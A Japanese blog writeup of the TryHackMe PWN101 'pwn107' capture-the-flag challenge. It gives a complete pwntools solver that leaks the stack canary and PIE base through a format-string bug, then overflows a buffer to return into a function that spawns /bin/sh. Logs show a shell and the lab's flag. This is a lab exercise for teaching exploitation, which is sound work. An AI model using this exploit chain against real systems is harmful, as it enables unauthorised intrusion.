---
title: TryHackMe PWN101 Writeup (7) PWN107
pubDatetime: 2026-04-26
description: TryHackMe PWN101 Challenge 7のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn107-1644307530397.pwn107
pwn107-1644307530397.pwn107: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0579b2a29d47165653fbb791fb528c59e951a1a0, not stripped
```

## checksec

canary+PIE

```shellsession
$ .venv/bin/pwn checksec pwn107-1644307530397.pwn107
[*] '/home/hat0uma/work/pwn107-1644307530397.pwn107'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## 実行

THMの連続記録

```shellsession
$ ./pwn107-1644307530397.pwn107
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? 3
Thanks, Happy hacking!!
Your current streak: 3


[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
```

## Ghidra

local_48がFSB, local_28がBOF
なのでCanary+get_streakのアドレスリークしてreturnを書き換え

```c
void main(void)

{
  long in_FS_OFFSET;
  char local_48 [32];
  undefined1 local_28 [24];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00100c68);
  puts(&DAT_00100c88);
  puts("You mailed about this to THM, and they responsed back with some questions");
  puts("Answer those questions and get your streak back\n");
  printf("THM: What\'s your last streak? ");
  read(0,local_48,0x14);
  printf("Thanks, Happy hacking!!\nYour current streak: ");
  printf(local_48);
  puts("\n\n[Few days latter.... a notification pops up]\n");
  puts(&DAT_00100db8);
  read(0,local_28,0x200);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


void get_streak(void)

{
  long lVar1;
  long in_FS_OFFSET;

  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  puts("This your last streak back, don\'t do this mistake again");
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## solver

```python
import pwn
from pwn import log


bin = "./pwn107-1644307530397.pwn107"
elf = pwn.ELF(bin)
pwn.context.binary = elf
# p = pwn.process(bin)
p = pwn.remote("10.146.179.24", 9007)

ret = p.recvuntil("last streak?".encode())

# ★canaryのリーク
# スタックの先頭はrbp - 0x40
# canaryがrbp - 0x08
# printfの第7引数が0x40, 第8引数が0x38, ...第14引数が0x08
# 書式文字列が第１引数なので、%13$pでcanaryをリークできる。
# 補足：canaryはだいたい末尾が00
#
# ★ベースアドレスのリーク
# ローカルで実行してデバッガで眺めると下のほう(+0x28)にmainのアドレスがある。
# ので同様に (0x40 + 0x28) / 8 + 7 = 20で%19$pでmainのアドレスが分かる。
#
# pwndbg> stack
# 00:0000│ rsi rsp 0x7fffffffe2f0 ◂— 0xa70252c7025 /* '%p,%p\n' */
# 01:0008│-038     0x7fffffffe2f8 ◂— 0
# ... ↓            3 skipped
# 05:0028│-018     0x7fffffffe318 —▸ 0x7ffff7fe5af0 (dl_main) ◂— endbr64
# 06:0030│-010     0x7fffffffe320 —▸ 0x7fffffffe410 —▸ 0x555555400780 (_start) ◂— xor ebp, ebp
# 07:0038│-008     0x7fffffffe328 ◂— 0xea0fcd941f8cb300
# pwndbg>
# 08:0040│ rbp 0x7fffffffe330 —▸ 0x7fffffffe3d0 —▸ 0x7fffffffe430 ◂— 0
# 09:0048│+008 0x7fffffffe338 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
# 0a:0050│+010 0x7fffffffe340 —▸ 0x7fffffffe380 ◂— 0
# 0b:0058│+018 0x7fffffffe348 —▸ 0x7fffffffe458 —▸ 0x7fffffffe783 ◂— '/home/hat0uma/work/pwn107-1644307530397.pwn107'
# 0c:0060│+020 0x7fffffffe350 ◂— 0x155400040 /* '@' */
# 0d:0068│+028 0x7fffffffe358 —▸ 0x555555400992 (main) ◂— push rbp
# 0e:0070│+030 0x7fffffffe360 —▸ 0x7fffffffe458 —▸ 0x7fffffffe783 ◂— '/home/hat0uma/work/pwn107-1644307530397.pwn107'
# 0f:0078│+038 0x7fffffffe368 ◂— 0x380b5c52b499940
p.send("%13$p;%19$p;".encode())
p.recvuntil(b"Your current streak:")
ret = p.recvline()
log.info(f"{ret}")

l = ret.strip().split(b";")
canary = int(l[0], 16)
main_addr = int(l[1], 16)
log.info(f"canary is 0x{canary:x}, main_addr is 0x{main_addr:x}")

# Ghidraで相対アドレス
main_rel_addr = 0x100992
# スタックのアライメント調整のためにPUSH RBPを飛ばした次の命令
get_streak_rel_addr = 0x10094D

base_addr = main_addr - main_rel_addr
get_streak_addr = base_addr + get_streak_rel_addr
log.info(f"base_addr = 0x{base_addr:x} get_streak_rel_addr = 0x{get_streak_addr:x}")

payload = b""
payload += b"1" * 24  # バッファを埋める
payload += canary.to_bytes(8, "little")  # リークしたcanaryを書き込む
payload += b"2" * 8  # saved_rbp
payload += get_streak_addr.to_bytes(8, "little")
log.info(payload)

ret = p.send(payload)
p.interactive()
```

実行結果

```shellsession
$ python3 solver-pwn107.py
[*] '/home/hat0uma/work/pwn107-1644307530397.pwn107'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Opening connection to 10.146.179.24 on port 9007: Done
[*] b' 0xdf2ca20b77fc7300;0x5594d2400992;\x94U\n'
[*] canary is 0xdf2ca20b77fc7300, main_addr is 0x5594d2400992
[*] base_addr = 0x5594d2300000 get_streak_rel_addr = 0x5594d240094d
/home/hat0uma/work/.venv/lib/python3.12/site-packages/pwnlib/log.py:396: BytesWarning: Bytes
is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
  self._log(logging.INFO, message, args, kwargs, 'info')
[*] 111111111111111111111111\x00süw
    ¢,ß22222222M        @Ò U\x00\x00
[*] Switching to interactive mode

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ ls
flag.txt
pwn107
pwn107.c
$ cat flag.txt
THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}
$
[*] Interrupted
[*] Closed connection to 10.146.179.24 port 9007
```
